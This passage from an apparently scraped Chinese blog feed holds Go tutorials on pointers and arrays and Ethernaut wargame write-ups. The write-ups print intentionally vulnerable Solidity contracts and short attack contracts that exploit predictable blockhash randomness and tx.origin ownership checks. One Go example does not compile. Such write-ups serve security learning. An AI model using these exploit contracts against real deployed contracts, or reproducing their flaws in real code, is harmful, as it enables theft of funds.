class="hljs-string">&quot;三级指针p3的值：%d，p3的目标地址：%d，下一个目标地址：%d，p3的链尾目标地址：%d\n&quot;</span>, p3 , *p3, **p3, ***p3)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="作为函数参数"><a href="#作为函数参数" class="headerlink" title="作为函数参数"></a>作为函数参数</h2><p>经常将指针作为函数参数，并在函数调用中修改</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在使用指针前你需要声明指针：&lt;code&gt;var name *type&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;type&lt;/code&gt;为指针类型，&lt;code&gt;name&lt;/code&gt;为指针变量名，&lt;code&gt;*&lt;/code&gt;号用于指定变量是一个指针。&lt;/p&gt;
&lt;p&gt;空指针：当一</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://lexlady.top/2024/04/17/Golang/go-array/"/>
    <id>http://lexlady.top/2024/04/17/Golang/go-array/</id>
    <published>2024-04-17T12:01:16.605Z</published>
    <updated>2024-04-17T12:25:49.869Z</updated>
    
    <content type="html"><![CDATA[<h2 id="声明数组"><a href="#声明数组" class="headerlink" title="声明数组"></a>声明数组</h2><p><code>Go</code>语言数组声明需要指定元素<strong>类型</strong>及元素<strong>个数</strong>：<br><code>var array_name [size]type</code></p><h2 id="初始化数组"><a href="#初始化数组" class="headerlink" title="初始化数组"></a>初始化数组</h2><p><code>var nums = [5]int&#123;100, 2, 5, 8, 10&#125; </code></p><p>通过字面量在声明数组的同时快速初始化数组：<br><code> nums := [5]int&#123;100, 2, 5, 8, 10&#125;</code></p><p>如果数组长度不确定可以使用<code>...</code>代替，此时编译器会根据元素个数自行推断数组长度<br><code>var nums = [...]int&#123;100, 2, 5, 8, 10&#125; </code></p><p><strong>设置了数组的长度</strong>，我们还可以通过指定下标(key:value)来初始化元素：<br><code>nums := [5]int&#123;1:2, 4:10&#125; // [0, 2, 0, 0, 10]</code></p><blockquote><p>初始化数组中<code>&#123;&#125;</code>中的元素个数不能大于<code>[]</code>中的数字。<br>在初始化时没有指定初值的元素将会赋值为零值<br>在Go语言中，数组的大小是类型的一部分，因此不同大小的数组是不同的类型，是不兼容的。</p></blockquote><h2 id="访问数组元素"><a href="#访问数组元素" class="headerlink" title="访问数组元素"></a>访问数组元素</h2><p>数组元素可以通过索引（位置）来读取。</p><p>例如：<code>array_name[index]</code></p><p>对数组的遍历多采用循环结构</p><h2 id="范围（Range）"><a href="#范围（Range）" class="headerlink" title="范围（Range）"></a>范围（Range）</h2><p><code>range</code>关键字用于循环中迭代数组、切片、通道或集合的元素。</p><p>在数组和切片中它返回元素的索引和索引对应的值，在集合中返回<code>key-value</code>对。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    arr := [...][]<span class="hljs-type">int</span>&#123;<br>        &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;,<br>        &#123;<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>&#125;,<br>    &#125;<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> arr &#123;<br>        <span class="hljs-keyword">for</span> j := <span class="hljs-keyword">range</span> arr[i] &#123;<br>            fmt.Println(arr[i][j])<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h2><p>Go 语言支持多维数组，以下为常用的多维数组声明方式：<br><code>var arr_name [SIZE1][SIZE2]...[SIZEN]type</code></p><p>二维数组是最简单的多维数组，本质是由多个一维数组组成。</p><p><code>var arrayName [x][y]type</code></p><p>二维数组可认为是一个表格，x 为行，y 为列.</p><p>多维数组初始化或赋值时需要注意<code>Go</code>语法规范，该写在一行就写在一行，一行一条语句。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go">a := [<span class="hljs-number">3</span>][<span class="hljs-number">4</span>]<span class="hljs-type">int</span>&#123;  <br> &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125; ,   <br> &#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>&#125; ,   <br> &#123;<span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>&#125;, <span class="hljs-comment">// 这里的 &#125; 必须要有逗号，因为最后一行的 &#125; 不能单独一行，</span><br>&#125;<br><br><span class="hljs-comment">// 或者写成这样</span><br>a := [<span class="hljs-number">3</span>][<span class="hljs-number">4</span>]<span class="hljs-type">int</span>&#123;  <br> &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125; ,   <br> &#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>&#125; ,   <br> &#123;<span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>&#125;&#125;   <br></code></pre></td></tr></table></figure><p><strong>实例</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">// 创建二维数组</span><br>    sites := [<span class="hljs-number">2</span>][<span class="hljs-number">2</span>]<span class="hljs-type">string</span>&#123;&#125;<br><br>    <span class="hljs-comment">// 向二维数组添加元素</span><br>    sites[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;Google&quot;</span><br>    sites[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;Runoob&quot;</span><br><br>    rows := []<span class="hljs-type">string</span>(<span class="hljs-string">&quot;Taobao&quot;</span>,<span class="hljs-string">&quot;Weibo&quot;</span>)<br>    sites = <span class="hljs-built_in">append</span>(sites, rows)<br><br>    <span class="hljs-comment">// 显示结果</span><br>    fmt.Println(<span class="hljs-string">&quot;sites:&quot;</span>)<br>    fmt.Println(sites)<br>    <span class="hljs-comment">// 显示一行的元素</span><br>    fmt.Println(<span class="hljs-string">&quot;Row 1:&quot;</span>)<br>    fmt.Println(sites[<span class="hljs-number">0</span>])<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="向函数传递数组的注意事项"><a href="#向函数传递数组的注意事项" class="headerlink" title="向函数传递数组的注意事项"></a>向函数传递数组的注意事项</h2><p>未定义长度的数组只能传给不限制数组长度的函数</p><p>定义了长度的数组只能传给限制了相同数组长度的函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-comment">// Go 语言的数组是值，其长度是其类型的一部分，作为函数参数时，是值传递</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">change1</span><span class="hljs-params">(nums [3]<span class="hljs-type">int</span>)</span></span> &#123;<br>    nums[<span class="hljs-number">0</span>] = <span class="hljs-number">4</span><br>&#125;<br><br><span class="hljs-comment">// 传递进来数组的内存地址，然后定义指针变量指向该地址，则会改变数组的值</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">change2</span><span class="hljs-params">(nums *[3]<span class="hljs-type">int</span>)</span></span> &#123;<br>    nums[<span class="hljs-number">0</span>] = <span class="hljs-number">5</span><br>&#125;<br><br><span class="hljs-comment">// Go 语言中对数组的处理，一般采用切片的方式，切片包含对底层数组内容的引用，作为函数参数时，类似于指针传递</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">change3</span><span class="hljs-params">(nums []<span class="hljs-type">int</span>)</span></span> &#123;  <br>    nums[<span class="hljs-number">0</span>] = <span class="hljs-number">6</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">var</span> nums1 = [<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;   <br>   <span class="hljs-keyword">var</span> nums2 = []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;    <br>   change1(nums1)    <br>   fmt.Println(nums1)  <span class="hljs-comment">//  [1 2 3]     </span><br>   change2(&amp;nums1)    <br>   fmt.Println(nums1)  <span class="hljs-comment">//  [5 2 3]    </span><br>   change3(nums2)    <br>   fmt.Println(nums2)  <span class="hljs-comment">//  [6 2 3]</span><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;声明数组&quot;&gt;&lt;a href=&quot;#声明数组&quot; class=&quot;headerlink&quot; title=&quot;声明数组&quot;&gt;&lt;/a&gt;声明数组&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Go&lt;/code&gt;语言数组声明需要指定元素&lt;strong&gt;类型&lt;/strong&gt;及元素&lt;strong&gt;个数&lt;/s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Fallback</title>
    <link href="http://lexlady.top/2023/11/15/Ethernaut/fallback/"/>
    <id>http://lexlady.top/2023/11/15/Ethernaut/fallback/</id>
    <published>2023-11-15T12:44:02.000Z</published>
    <updated>2023-11-15T08:27:51.873Z</updated>
    
    <content type="html"><![CDATA[<p>任务要求：获取合约的所有权；将余额减为零<br><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs s">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Fallback &#123;<br><br>  mapping(address =&gt; uint) public contributions;<br>  address public owner;<br><br>  constructor() &#123;<br>    owner = msg.sender;<br>    contributions[msg.sender] = 1000 * (1 ether);<br>  &#125;<br><br>  modifier onlyOwner &#123;<br>        require(<br>            msg.sender == owner,<br>            &quot;caller is not the owner&quot;<br>        );<br>        _;<br>    &#125;<br><br>  function contribute() public payable &#123;<br>    require(msg.value &lt; 0.001 ether);<br>    contributions[msg.sender] += msg.value;<br>    if(contributions[msg.sender] &gt; contributions[owner]) &#123;<br>      owner = msg.sender;<br>    &#125;<br>  &#125;<br><br>  function getContribution() public view returns (uint) &#123;<br>    return contributions[msg.sender];<br>  &#125;<br><br>  function withdraw() public onlyOwner &#123;<br>    payable(owner).transfer(address(this).balance);<br>  &#125;<br><br>  receive() external payable &#123;<br>    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);<br>    owner = msg.sender;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解题点：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs s">receive() external payable &#123;<br>  require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);<br>  owner = msg.sender;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过标记owner变量快速查询有关获取合约的所有权的代码。</p><p>在receive方法中我们能够更改owner，在此之前需要我们在contributions中有一点余额，这只需要执行contribute方法就能实现。</p><p>解题参考：<br>1）执行实例中的<code>contribute()</code>，向合约发送最多<code>0.001 ether</code>。<br>2）向合约发送以太，触发<code>receive()</code>。<br>3）执行实例中的<code>withdraw()</code>。</p><blockquote><p>receive()</p><ul><li>一个合约至多含有一个receive()函数,</li><li>没有function关键字、没有参数，没有返回值</li><li>可见性必须声明为external，必须含有payable关键字</li><li>允许使用modifier修改器</li></ul><p>当本合约收到ether但并未被调用任何函数，未接受任何数据，<code>receive()</code>被触发，执行ether的传输（类似于基本的<code>send(),transfer()</code>）；如果合约中不存在此类方法，但拥有一个可支付的回退函数将触发回退函数执行ether的操作；如果都不存在，那么合约将不能接受ether并抛出异常</p><p>选自<a href="https://docs.soliditylang.org/en/v0.8.13/contracts.html#receive-ether-function">solidity官方文档v0.8.13</a></p></blockquote><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;任务要求：获取合约的所有权；将余额减为零&lt;br&gt;&lt;strong&gt;源代码：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;lin</summary>
      
    
    
    
    <category term="Ethernaut" scheme="http://lexlady.top/categories/Ethernaut/"/>
    
    
    <category term="题解" scheme="http://lexlady.top/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="Ethereum" scheme="http://lexlady.top/tags/Ethereum/"/>
    
  </entry>
  
  <entry>
    <title>Fallout</title>
    <link href="http://lexlady.top/2023/11/15/Ethernaut/fallout/"/>
    <id>http://lexlady.top/2023/11/15/Ethernaut/fallout/</id>
    <published>2023-11-15T12:44:02.000Z</published>
    <updated>2023-11-15T08:32:21.592Z</updated>
    
    <content type="html"><![CDATA[<p>任务要求：获取合约的所有权</p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs s">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;<br><br>contract Fallout &#123;<br>  <br>  using SafeMath for uint256;<br>  mapping (address =&gt; uint) allocations;<br>  address payable public owner;<br><br><br>  /* constructor */<br>  function Fal1out() public payable &#123;<br>    owner = msg.sender;<br>    allocations[owner] = msg.value;<br>  &#125;<br><br>  modifier onlyOwner &#123;<br>        require(<br>            msg.sender == owner,<br>            &quot;caller is not the owner&quot;<br>        );<br>        _;<br>    &#125;<br><br>  function allocate() public payable &#123;<br>    allocations[msg.sender] = allocations[msg.sender].add(msg.value);<br>  &#125;<br><br>  function sendAllocation(address payable allocator) public &#123;<br>    require(allocations[allocator] &gt; 0);<br>    allocator.transfer(allocations[allocator]);<br>  &#125;<br><br>  function collectAllocations() public onlyOwner &#123;<br>    msg.sender.transfer(address(this).balance);<br>  &#125;<br><br>  function allocatorBalance(address allocator) public view returns (uint) &#123;<br>    return allocations[allocator];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解题点：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs s">contract Fallout is Ownable &#123;...<br><br>function Fal1out() public payable &#123;...<br></code></pre></td></tr></table></figure><p>注意solidity版本为0.6，这意味着该合约的构造函数是由<code>function 合约名</code>实现的，而在此合约中作为构造函数其名称居然与合约名称不一致，使其成为了任何人都可以执行的公共函数</p><blockquote><p>在solidity 0.4.22版本及其之后中使用function声明构造函数的方法被舍弃，而采用了使用关键字constructor来声明构造函数。</p><blockquote><p>这是在使用编译器0.4.22之前的版本时所需注意的</p></blockquote></blockquote><p>参考：直接调用<code>Fal1out()</code></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;任务要求：获取合约的所有权&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;源代码：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;</summary>
      
    
    
    
    <category term="Ethernaut" scheme="http://lexlady.top/categories/Ethernaut/"/>
    
    
    <category term="题解" scheme="http://lexlady.top/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="Ethereum" scheme="http://lexlady.top/tags/Ethereum/"/>
    
  </entry>
  
  <entry>
    <title>Coin Flip</title>
    <link href="http://lexlady.top/2023/11/15/Ethernaut/coinflip/"/>
    <id>http://lexlady.top/2023/11/15/Ethernaut/coinflip/</id>
    <published>2023-11-15T12:44:02.000Z</published>
    <updated>2023-11-15T08:34:20.534Z</updated>
    
    <content type="html"><![CDATA[<p>任务要求：连续猜对硬币的正反面十次。<del>区区千分之一的运气我也不是没有</del>  </p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs s">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract CoinFlip &#123;<br><br>  uint256 public consecutiveWins;<br>  uint256 lastHash;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  constructor() &#123;<br>    consecutiveWins = 0;<br>  &#125;<br><br>  function flip(bool _guess) public returns (bool) &#123;<br>    uint256 blockValue = uint256(blockhash(block.number - 1));<br><br>    if (lastHash == blockValue) &#123;<br>      revert();<br>    &#125;<br><br>    lastHash = blockValue;<br>    uint256 coinFlip = blockValue / FACTOR;<br>    bool side = coinFlip == 1 ? true : false;<br><br>    if (side == _guess) &#123;<br>      consecutiveWins++;<br>      return true;<br>    &#125; else &#123;<br>      consecutiveWins = 0;<br>      return false;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解题点：</strong><br>硬币的正反面取决于上一个块，结果看起来是随机的但却是可预测的，我们也可以通过获取上一个区块的信息来运行一次题目的算法然后选择对应的结果。因为在一个区块中的交易不止一个，所以只要保证在生成下一个区块前将完成操作即可。</p><p>然而，最优解是通过在另外一份合约，执行预测逻辑，获得对应结果后再调用coinflip完成目标。</p><p>参考：<br>获取实例地址<br>在remix上部署一份攻击合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs s">contract Hack &#123;<br>  CoinFlip target;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  constructor(address _target) &#123;<br>    target = CoinFlip(_target);<br>  &#125;<br><br>  function flip() public &#123;<br>    bool guess = _guess();<br>    target.flip(guess);<br>  &#125;<br><br>  function _guess() private view returns (bool) &#123;<br>    uint256 blockValue = uint256(blockhash(block.number - 1));<br>    uint256 coinFlip = blockValue / FACTOR;<br>    bool side = coinFlip == 1 ? true : false;<br>    return side;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后连续使用攻击合约的flip方法进行攻击10次就行</p><blockquote><p>Tips：<br>SafeMath库：防溢出的增强型运算方法<br>block.num：当前区块数（需要添加一个与web3的链接<br>block.blockhash：区块哈希值</p></blockquote><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;任务要求：连续猜对硬币的正反面十次。&lt;del&gt;区区千分之一的运气我也不是没有&lt;/del&gt;  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;源代码：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=</summary>
      
    
    
    
    <category term="Ethernaut" scheme="http://lexlady.top/categories/Ethernaut/"/>
    
    
    <category term="题解" scheme="http://lexlady.top/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="Ethereum" scheme="http://lexlady.top/tags/Ethereum/"/>
    
  </entry>
  
  <entry>
    <title>Telephone</title>
    <link href="http://lexlady.top/2023/11/15/Ethernaut/telephone/"/>
    <id>http://lexlady.top/2023/11/15/Ethernaut/telephone/</id>
    <published>2023-11-15T12:44:02.000Z</published>
    <updated>2023-11-15T08:41:44.598Z</updated>
    
    <content type="html"><![CDATA[<p>任务要求：获取合约的所有权  </p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs s">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Telephone &#123;<br><br>  address public owner;<br><br>  constructor() &#123;<br>    owner = msg.sender;<br>  &#125;<br><br>  function changeOwner(address _owner) public &#123;<br>    if (tx.origin != msg.sender) &#123;<br>      owner = _owner;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解题点：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs s">function changeOwner(address _owner) public &#123;<br>    if (tx.origin != msg.sender) &#123;<br>      owner = _owner;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>本题涉及到tx.origin与msg.sender的区别：</p><blockquote><p>tx.origin是发起交易的账户<br>msg.sender是当前直接调用这个合约的即时账户</p></blockquote><p>例如：Alice通过调用合约A来调用合约B，合约A中与合约B中的tx.origin与msg.sender的情形如下：</p><table><thead><tr><th>Alice</th><th>-&gt;A</th><th>-&gt;B</th></tr></thead><tbody><tr><td>tx.origin</td><td>Alice</td><td>Alice</td></tr><tr><td>msg.sender</td><td>Alice</td><td>A</td></tr></tbody></table><p>如果情景是在一个合约下的调用，那么这两者是没有区别的；</p><p>参考：将合约复制到Remix中，再编写一个攻击合约，在Ethernaut上获取实例地址，在remix上连接MetaMask钱包部署攻击合约，通过攻击合约调用实例中的方法改变owner</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs s">contract Hack &#123;<br>  constructor(address _addr) &#123;<br>    Telephone(_addr).changeOwner(msg.sender);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;任务要求：获取合约的所有权  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;源代码：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line</summary>
      
    
    
    
    <category term="Ethernaut" scheme="http://lexlady.top/categories/Ethernaut/"/>
    
    
    <category term="题解" scheme="http://lexlady.top/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="Ethereum" scheme="http://lexlady.top/tags/Ethereum/"/>
    
  </entry>
  
  <entry>
    <title>Token</title>
    <link href="http://lexlady.top/2023/11/15/Ethernaut/token/"/>
    <id>http://lexlady.top/2023/11/15/Ethernaut/token/</id>
    <published>2023-11-15T12:44:02.000Z</published>
    <updated>2024-04-09T14:28:39.082Z</updated>
    
    <content type="html"><![CDATA[<p>任务要求：获取更多的Token  </p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs s">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Token &#123;<br><br>  mapping(address =&gt; uint) balances;<br>  uint public totalSupply;<br><br>  constructor(uint _initialSupply) public &#123;<br>    balances[msg.sender] = totalSupply = _initialSupply;<br>  &#125;<br><br>  function transfer(address _to, uint _value) public returns (bool) &#123;<br>    require(balances[msg.sender] - _value &gt;= 0);<br>    balances[msg.sender] -= _value;<br>    balances[_to] += _value;<br>    return true;<br>  &#125;<br><br>  function balanceOf(address _owner) public view returns (uint balance) &#123;<br>    return balances[_owner];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解题点：</strong></p><figure class="highlight 